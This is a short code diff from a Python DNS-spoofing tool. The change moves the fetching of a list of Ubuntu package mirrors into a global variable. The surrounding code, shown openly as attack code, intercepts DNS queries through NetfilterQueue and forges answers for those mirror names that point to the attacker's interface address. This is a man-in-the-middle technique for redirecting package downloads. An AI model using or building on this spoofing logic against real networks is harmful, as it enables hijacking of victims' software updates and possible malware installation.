@@ -12,6 +12,9 @@ def dns_spoof(interface):
 
     nfqueue = NetfilterQueue()
 
+    global mirrors
+    mirrors = get_list_of_mirrors()
+
     try:
         print("Started DNS spoofing")
 
@@ -38,7 +41,7 @@ def modify_packet(packet):
     qname = packet[DNSQR].qname
     qname_dec = qname.decode('utf-8')
     # if qname == b"nl.archive.ubuntu.com.":
-    mirrors = get_list_of_mirrors()
+    # mirrors = get_list_of_mirrors()
     qnames = [link + "." for link in mirrors]
     if qname_dec in qnames:
         packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))
